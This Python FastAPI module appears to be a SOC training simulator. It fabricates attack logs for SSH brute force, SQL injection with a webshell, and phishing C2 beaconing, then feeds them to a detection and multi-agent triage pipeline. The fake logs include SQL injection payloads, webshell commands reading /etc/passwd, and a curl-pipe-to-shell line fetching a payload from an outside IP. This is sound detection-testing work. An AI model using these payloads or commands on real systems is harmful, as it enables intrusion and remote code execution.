import datetime
from fastapi import APIRouter, Depends, BackgroundTasks, Query
from sqlalchemy.orm import Session
from app.db.session import get_db, SessionLocal
from app.db import schemas, crud, models
from app.ingest.normalizer import normalizer
from app.rules.engine import rule_engine
from app.agents.orchestrator import orchestrator

router = APIRouter()

async def run_pipeline_bg(alert_id: str):
    db = SessionLocal()
    try:
        await orchestrator.run_pipeline_for_alert(db, alert_id)
    finally:
        db.close()

def generate_scenario_logs(scenario: str, attacker_ip: str = "194.26.29.112", host: str = "corp-db-01.internal"):
    now = datetime.datetime.utcnow()
    logs = []

    if scenario == "ssh_bruteforce":
        # 1. Burst of failed logins
        usernames = ["root", "admin", "test", "ubuntu", "user", "guest"]
        for i in range(12):
            u = usernames[i % len(usernames)]
            ts_str = (now - datetime.timedelta(seconds=(12 - i) * 5)).strftime("%b %d %H:%M:%S")
            raw = f"{ts_str} {host} sshd[128{i}]: Failed password for invalid user {u} from {attacker_ip} port {41200 + i} ssh2"
            logs.append(normalizer.normalize(raw, source_hint="auth_log"))
        
        # 2. Successful login
        ts_str = now.strftime("%b %d %H:%M:%S")
        raw_success = f"{ts_str} {host} sshd[12999]: Accepted password for ubuntu from {attacker_ip} port 41300 ssh2"
        logs.append(normalizer.normalize(raw_success, source_hint="auth_log"))

        # 3. Privilege escalation via sudo
        raw_sudo = f"{ts_str} {host} sudo: ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash"
        logs.append(normalizer.normalize(raw_sudo, source_hint="auth_log"))

    elif scenario == "sqli_webshell":
        # 1. SQLi reconnaissance
        sqli_payloads = [
            "/api/products?id=1' UNION SELECT username,password_hash FROM users--",
            "/search?q=test' OR '1'='1'--",
            "/portal/login.php?user=admin' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        for url in sqli_payloads:
            raw = f'{attacker_ip} - - [{now.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {url} HTTP/1.1" 500 1204 "https://portal.company.com" "sqlmap/1.7#dev"'
            logs.append(normalizer.normalize(raw, source_hint="nginx"))

        # 2. Web shell access & command execution
        shell_urls = [
            "/uploads/cmd.php?cmd=whoami",
            "/uploads/cmd.php?cmd=cat%20/etc/passwd",
            "/uploads/cmd.php?cmd=curl%20http://194.26.29.112/payload.sh%20|%20sh"
        ]
        for url in shell_urls:
            raw = f'{attacker_ip} - - [{now.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {url} HTTP/1.1" 200 840 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'
            logs.append(normalizer.normalize(raw, source_hint="nginx"))

    elif scenario == "phishing_c2":
        # Windows events: Outlook spawning powershell with beaconing
        logs.append(normalizer.normalize({
            "EventID": "4688",
            "Computer": "workstation-eng-04",
            "EventData": {
                "TargetUserName": "saim.ali",
                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
                "ParentProcessName": "OUTLOOK.EXE"
            }
        }, source_hint="windows_json"))

        logs.append(normalizer.normalize({
            "EventID": "3",
            "Computer": "workstation-eng-04",
            "EventData": {
                "TargetUserName": "saim.ali",
                "DestinationIp": "185.220.101.5",
                "DestinationPort": "443",
                "Protocol": "tcp",
                "BeaconInterval": "60s"
            }
        }, source_hint="windows_json"))

    else:  # benign_traffic
        for i in range(8):
            raw = f'10.0.1.{20+i} - - [{now.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /static/dashboard.css HTTP/1.1" 200 4501 "https://corp.internal" "Mozilla/5.0"'
            norm = normalizer.normalize(raw, source_hint="nginx")
            norm["event_type"] = "benign_web_access"
            logs.append(norm)

    return logs

@router.post("/run", response_model=schemas.SimulatorRunResponse)
async def run_simulator(
    background_tasks: BackgroundTasks,
    scenario: str = Query(..., description="ssh_bruteforce, sqli_webshell, phishing_c2, or benign_traffic"),
    attacker_ip: str = Query("194.26.29.112"),
    target_host: str = Query("corp-db-01.internal"),
    db: Session = Depends(get_db)
):
    # Generate attack logs
    logs_data = generate_scenario_logs(scenario, attacker_ip=attacker_ip, host=target_host)
    created_events = crud.create_log_events(db, logs_data)

    if scenario == "benign_traffic":
        # Create a low-confidence noise alert to demonstrate noise filtration
        noise_alert = crud.create_alert(
            db=db,
            rule_id="RULE-BENIGN-HEALTHCHECK",
            title="Routine Internal Traffic Burst",
            event_ids=[e.id for e in created_events],
            severity="low",
            confidence=0.3,
            is_noise=True
        )
        background_tasks.add_task(run_pipeline_bg, noise_alert.id)
        return {
            "scenario": scenario,
            "status": "injected",
            "logs_generated": len(created_events),
            "incident_id": None,
            "message": "Benign traffic batch injected. Triage Agent will identify and dismiss this as noise."
        }

    # Evaluate against pre-filter rules
    candidate_alerts = rule_engine.evaluate_events(created_events)
    incident_id = None

    if candidate_alerts:
        for alert_data in candidate_alerts:
            alert = crud.create_alert(
                db=db,
                rule_id=alert_data["rule_id"],
                title=alert_data["title"],
                event_ids=alert_data["event_ids"],
                severity=alert_data["severity"],
                confidence=alert_data["confidence"],
                is_noise=False
            )
            # Run multi-agent pipeline immediately in background
            background_tasks.add_task(run_pipeline_bg, alert.id)
    else:
        # Fallback: force alert creation for simulator scenario
        alert = crud.create_alert(
            db=db,
            rule_id=f"SIM-{scenario.upper()}",
            title=f"Simulated Attack: {scenario.replace('_', ' ').title()}",
            event_ids=[e.id for e in created_events],
            severity="critical" if "webshell" in scenario or "c2" in scenario else "high",
            confidence=0.95,
            is_noise=False
        )
        background_tasks.add_task(run_pipeline_bg, alert.id)

    return {
        "scenario": scenario,
        "status": "launched",
        "logs_generated": len(created_events),
        "incident_id": incident_id,
        "message": f"Successfully executed '{scenario}' attack sequence. Multi-agent SOC pipeline triggered!"
    }


@router.post("/reset")
def reset_soc_data(db: Session = Depends(get_db)):
    """Clear all past simulation events, alerts, incidents, agent runs, actions, reports and audit logs."""
    import glob
    import os

    # Delete child records first to respect foreign keys
    db.query(models.AgentStep).delete()
    db.query(models.AgentRun).delete()
    db.query(models.ResponseAction).delete()
    db.query(models.Report).delete()
    db.query(models.Incident).delete()
    db.query(models.Alert).delete()
    db.query(models.LogEvent).delete()
    db.query(models.AuditLog).delete()
    db.commit()

    # Clear generated reports on disk
    for pattern in ["reports_generated/*.pdf", "backend/reports_generated/*.pdf"]:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
            except Exception:
                pass

    return {
        "status": "success",
        "message": "All previous incidents, alerts, logs, and reports have been reset to a pristine state."
    }

